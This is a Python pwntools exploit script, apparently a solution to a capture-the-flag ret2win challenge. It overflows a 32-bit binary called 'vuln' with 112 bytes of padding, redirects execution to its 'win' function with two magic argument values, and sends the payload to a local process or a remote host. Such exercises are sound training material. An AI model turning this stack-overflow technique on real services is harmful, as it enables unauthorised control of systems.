import pwn
import argparse

parser = argparse.ArgumentParser()
parser.add_argument("destination", type=str, choices={"local", "remote"})
parser.add_argument("--target", "-t", type=str, default="", required=False)
parser.add_argument("--port", "-p", type=int, required=False)
args = parser.parse_args()

pwn.context.terminal = ["tmux", "splitw", "-v"]

elf = pwn.ELF("vuln")
offset = 112

new_eip = pwn.p32(elf.symbols["win"])
return_address = pwn.p32(elf.symbols["main"])

payload = b"".join(
        [
            b"A" * offset,
            new_eip,
            return_address,
            pwn.p32(0xcafef00d),
            pwn.p32(0xf00df00d)
        ]
)

payload += b"\n"

with open("payload", "wb") as filp:
    filp.write(payload)

if args.destination == "local":
    p = elf.process()
elif args.destination == "remote":
    p = pwn.remote(args.target, args.port)

#p = elf.process()
#g = pwn.gdb.attach(
#        p,
#        gdbscript="""
#        b win
#        c
#        """,
#)

#print(p.recv().decode("utf-8"))
p.sendline(payload)
#print(p.recv().decode("latin-1"))
p.interactive()



